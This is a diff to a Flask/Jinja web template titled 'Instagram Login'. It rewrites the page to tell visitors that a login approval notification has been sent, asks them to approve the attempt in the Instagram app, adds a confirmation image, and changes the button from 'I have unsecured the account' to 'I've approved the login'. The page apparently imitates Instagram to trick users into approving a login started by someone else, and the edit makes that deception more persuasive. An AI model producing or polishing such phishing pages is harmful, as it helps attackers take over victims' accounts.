@@ -8,10 +8,15 @@
 <body>
     <div class="container">
         <h1>Instagram Login</h1>
-        <p>Instagram requires 2FA. But in this case, you only need to confirm the login attempt manually.</p>
-        <p>✅ Please approve it in the Instagram app or browser.</p>
+        <p>Instagram requires approval for this login attempt.</p>
+        <p>✅ A notification has been sent to your Instagram app or email.</p>
+        <p>Please open Instagram and approve the login attempt.</p>
+        <p>You should see a notification asking you to confirm it's you.</p>
+        <div style="margin: 20px 0;">
+            <img src="{{ url_for('static', filename='confirm.png') }}" alt="Confirm Login" style="max-width: 100%; height: auto;">
+        </div>
         <form method="POST">
-            <button type="submit">I have unsecured the account</button>
+            <button type="submit">I've approved the login</button>
         </form>
         {% if error %}
             <p class="error">⚠️ {{ error }}</p>
